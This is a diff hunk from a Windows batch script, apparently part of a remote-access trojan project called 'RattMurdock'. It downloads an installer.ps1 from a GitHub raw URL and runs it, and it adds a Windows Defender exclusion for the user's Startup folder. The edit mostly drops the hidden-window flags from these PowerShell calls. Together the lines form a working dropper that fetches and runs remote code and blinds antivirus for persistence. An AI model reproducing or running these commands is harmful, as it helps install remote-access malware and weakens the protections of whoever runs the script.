@@ -29,14 +29,14 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 
 REM Download the installer.ps1 script from GitHub using PowerShell
-powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Zeyadm8112/RattMurdock/remote-access/installer.ps1' -OutFile 'installer.ps1'"
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Zeyadm8112/RattMurdock/remote-access/installer.ps1' -OutFile 'installer.ps1'"
 @REM powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Zeyadm8112/RattMurdock/main/installer.ps1' -OutFile 'installer.ps1'"
 
 REM Add exclusion path for Windows Defender using PowerShell
-powershell -NoProfile -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
+powershell  -Command "Add-MpPreference -ExclusionPath 'C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
 
     REM Run the downloaded installer.ps1 script using PowerShell
-powershell -NoProfile -File "installer.ps1"
+powershell  -File "installer.ps1"
 
 
 
